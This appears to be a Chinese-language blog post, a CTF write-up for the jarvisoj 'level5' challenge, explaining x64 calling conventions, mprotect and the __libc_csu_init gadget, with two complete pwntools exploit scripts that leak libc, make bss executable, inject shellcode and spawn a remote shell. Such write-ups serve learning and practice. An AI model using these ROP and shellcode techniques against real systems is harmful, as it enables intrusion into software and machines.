@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="64位参数传递约定：前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中。参数超过六个时，从第七个开始压入栈中 jnz ：z 是 zero 的意思，所以这命令是说如果不为零则跳转，或者说是如果不相等则跳转 这个 ret2libc 用这个式子想想，不要记错了mprotect_real &#x3D; (mprtotect_lib - read_lib ) + read_real">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN｜level5 jarvisoj">
+<meta property="og:url" content="http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="64位参数传递约定：前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中。参数超过六个时，从第七个开始压入栈中 jnz ：z 是 zero 的意思，所以这命令是说如果不为零则跳转，或者说是如果不相等则跳转 这个 ret2libc 用这个式子想想，不要记错了mprotect_real &#x3D; (mprtotect_lib - read_lib ) + read_real">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013226.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013239.jpg">
+<meta property="article:published_time" content="2020-04-26T22:15:14.000Z">
+<meta property="article:modified_time" content="2021-02-16T17:32:51.862Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013226.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PWN｜level5 jarvisoj</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/27/Android%EF%BD%9CpostmarketOS/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/27/PWN-study-0x03/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&text=PWN｜level5 jarvisoj"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&is_video=false&description=PWN｜level5 jarvisoj"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN｜level5 jarvisoj&body=Check out this article: http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&title=PWN｜level5 jarvisoj"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&name=PWN｜level5 jarvisoj&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/04/27/PWN%EF%BD%9Clevel5-jarvisoj/&t=PWN｜level5 jarvisoj"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PWN｜level5 jarvisoj
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-26T22:15:14.000Z" itemprop="datePublished">2020-04-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>64位参数传递约定：前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中。参数超过六个时，从第七个开始压入栈中</p>
+<p>jnz ：z 是 zero 的意思，所以这命令是说如果不为零则跳转，或者说是如果不相等则跳转</p>
+<p>这个 ret2libc 用这个式子想想，不要记错了<br>mprotect_real = (mprtotect_lib - read_lib ) + read_real<br>mprotect_real - mprtotect_lib = read_real - read_lib</p>
+<p>没有用 mmap 函数，我用的是 mprotect<br>mprotect 函数是干啥的<br>int mprotect(void* addr, size_t len, int port)<br>mprotect函数可以改变一块内存区域的权限(以页为单位)。mprotect函数是可以改变一个段的权限的，可以利用这一特点将bss段改为可执行，将shellcode写到bss段，再想办法执行即可。<br>首先，要使用mprotect函数，依然需要知道它在内存中的地址，通过level3的方法可以得到。<br>需要调用这个mprotect函数，我们发现它有三个参数，第一个是要设置的地址(edi)，第二个是设置的长度(esi)，第三个是权限值(edx)，但是我们在level3中发现简单的gadgets并没有pop edx，这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:0000000000400650                 push    r15</span><br><span class="line">.text:0000000000400652                 mov     r15d, edi</span><br><span class="line">.text:0000000000400655                 push    r14</span><br><span class="line">.text:0000000000400657                 mov     r14, rsi</span><br><span class="line">.text:000000000040065A                 push    r13</span><br><span class="line">.text:000000000040065C                 mov     r13, rdx</span><br><span class="line">.text:000000000040065F                 push    r12</span><br><span class="line">.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400668                 push    rbp</span><br><span class="line">.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400670                 push    rbx</span><br><span class="line">.text:0000000000400671                 sub     rbp, r12</span><br><span class="line">.text:0000000000400674                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400676                 sar     rbp, 3</span><br><span class="line">.text:000000000040067A                 sub     rsp, 8</span><br><span class="line">.text:000000000040067E                 call    _init_proc</span><br><span class="line">.text:0000000000400683                 test    rbp, rbp</span><br><span class="line">.text:0000000000400686                 jz      short loc_4006A6</span><br><span class="line">.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400690</span><br><span class="line">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400690                 mov     rdx, r13</span><br><span class="line">.text:0000000000400693                 mov     rsi, r14</span><br><span class="line">.text:0000000000400696                 mov     edi, r15d</span><br><span class="line">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040069D                 add     rbx, 1</span><br><span class="line">.text:00000000004006A1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006A4                 jnz     short loc_400690</span><br><span class="line">.text:00000000004006A6</span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j</span><br><span class="line">.text:00000000004006A6                 add     rsp, 8</span><br><span class="line">.text:00000000004006AA                 pop     rbx</span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn</span><br><span class="line">.text:00000000004006B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<p>在loc_4006A6这个函数下面，有6个pop。在loc_400690函数下面刚好前三个寄存器的赋值语句，以及一个call函数调用，简直完美有没有。所以我们只需要先调用loc_4006A6将r13,r14,r15设置为mprotect函数的三个参数值，将r12设置为mprotect的地址，rbx置0，再调用loc_400690的时候，自然就执行mprotect函数了。（为了跳出这个循环，还需将rbp设置为1）<br>在这里是通过call调用函数，所以我们还需要将需要调用的函数地址写道got table中。这个通过read函数就可以了。</p>
+<blockquote>
+<p>sendline 结尾有换行符，所以传输容易出错，将 \n (也就是 \x0a) 写入变量。开始我一直没找到这个问题，后面经过 publicQi 师傅点拨，在有连续的 sendline 的地方，将后一个改为了 send。至此 exp 执行成功 <img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013226.png" alt="public"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013239.jpg" alt="public2"></p>
+</blockquote>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">BIN = <span class="string">&#x27;./level3_x64&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9884</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sh</span>):</span></span><br><span class="line">    <span class="comment">##############################################</span></span><br><span class="line">    <span class="comment">#get mprotect_addr</span></span><br><span class="line">    rdi = <span class="number">0x4006b3</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    rsi_r15 = <span class="number">0x4006b1</span>  <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.19.so&#x27;</span>)</span><br><span class="line">    write_lib = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    mprtotect_lib = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    read_plt = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    vul_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">    padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span></span><br><span class="line">    payload1 = padding + p64(rdi) + p64(<span class="number">1</span>) + p64(rsi_r15) + p64(write_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(<span class="number">0x4004F0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">    sh.send(payload1)</span><br><span class="line">    write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">    mprotect_real = (mprtotect_lib - write_lib ) + write_addr</span><br><span class="line">    log.success(<span class="string">&quot;mprotect_real==&gt;&quot;</span> + <span class="built_in">hex</span>(mprotect_real))</span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    <span class="comment">#write the shellcode to bss</span></span><br><span class="line">    bss_addr = elf.bss()</span><br><span class="line">    shellcode = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    <span class="comment">#shellcode = &#x27;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span></span><br><span class="line">    payload2 = padding + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi_r15) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(read_plt) + p64(<span class="number">0x4004F0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload2)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.send(shellcode)</span><br><span class="line">    log.success(<span class="string">&quot;write the shellcode to bss&quot;</span>)</span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    <span class="comment">#write the bss to got_table</span></span><br><span class="line">    bss_got = <span class="number">0x600a48</span></span><br><span class="line">    payload3 = padding + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi_r15) + p64(bss_got) + p64(<span class="number">0</span>) + p64(read_plt) + p64(<span class="number">0x4004F0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload3)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.send(p64(bss_addr))</span><br><span class="line">    log.success(<span class="string">&quot;write the bss to got_table&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    <span class="comment">#write the mprotect to got_table</span></span><br><span class="line">    mprotect_got = <span class="number">0x600a50</span></span><br><span class="line">    <span class="comment">#ayload_5 = padding + p64(rdi) + p64(0) + p64(rsi_r15) + p64(mprotect_got) + p64(0) + p64(read_plt) + p64(vul_addr)</span></span><br><span class="line">    payload4 = padding + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi_r15) + p64(mprotect_got) + p64(<span class="number">0</span>) + p64(read_plt) + p64(<span class="number">0x4004F0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload4)</span><br><span class="line">    sh.send(p64(mprotect_real))</span><br><span class="line">    log.success(<span class="string">&quot;write the mprotect to got_table&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    loc_4006A6 = <span class="number">0x4006a6</span></span><br><span class="line">    <span class="comment">#add rsp,8</span></span><br><span class="line">    <span class="comment">#pop rbx</span></span><br><span class="line">    <span class="comment">#pop rbp</span></span><br><span class="line">    <span class="comment">#pop r12</span></span><br><span class="line">    <span class="comment">#pop r13</span></span><br><span class="line">    <span class="comment">#pop r14</span></span><br><span class="line">    <span class="comment">#pop r15</span></span><br><span class="line">    <span class="comment">#retn</span></span><br><span class="line">    loc_400690 = <span class="number">0x400690</span></span><br><span class="line">    <span class="comment">#mov rdx,r13  the 3rd parm</span></span><br><span class="line">    <span class="comment">#mov rsi,r14  the 2nd parm</span></span><br><span class="line">    <span class="comment">#mov edi,r15  the 1st parm</span></span><br><span class="line">    <span class="comment">#call [r12]</span></span><br><span class="line">    <span class="comment">#add rbx,1</span></span><br><span class="line">    <span class="comment">#cmp rbx,rbp</span></span><br><span class="line">    <span class="comment">#jnz short loc_400690</span></span><br><span class="line">    payload5 = padding + p64(loc_4006A6)</span><br><span class="line">    payload5 += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(mprotect_got) + p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">    payload5 += p64(loc_400690)</span><br><span class="line">    payload5 += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_got) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload5 += p64(loc_400690)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">    sh.send(payload5)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    log.success(<span class="string">&quot;send payload5 success&quot;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    elf = ELF(BIN)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        LOCAL = <span class="literal">False</span></span><br><span class="line">        sh = remote(HOST,PORT)</span><br><span class="line">        exploit(sh)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="literal">True</span></span><br><span class="line">        sh = process(BIN)</span><br><span class="line">        log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">        <span class="comment"># pause</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">        exploit(sh)</span><br></pre></td></tr></table></figure>
+<p>另外一种利用方法，没有用 _libc_csu_init ，rdx 传参数是直接在 libc 中找的 pop rdx</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">file=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">prdi=<span class="number">0x4006b3</span></span><br><span class="line">prsi=<span class="number">0x4006b1</span></span><br><span class="line">bss_start=<span class="number">0x600a88</span></span><br><span class="line">start_addr=<span class="number">0x4004f0</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(prdi)+p64(<span class="number">1</span>)+p64(prsi)+p64(file.got[<span class="string">&#x27;write&#x27;</span>])+<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>+p64(file.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload1+=p64(start_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.send(payload1)</span><br><span class="line">write_got=u64(r.recv(<span class="number">8</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base=write_got-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">prdx=libc_base+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(prdi)+p64(<span class="number">0x600000</span>)+p64(prsi)+p64(<span class="number">0x1000</span>)+<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>+p64(prdx)+p64(<span class="number">7</span>)+p64(mprotect)+p64(start_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(prdi)+p64(<span class="number">0</span>)+p64(prsi)+p64(bss_start)+<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>+p64(prdx)+p64(<span class="number">48</span>)+p64(file.plt[<span class="string">&#x27;read&#x27;</span>])+p64(start_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(bss_start)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.send(payload4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
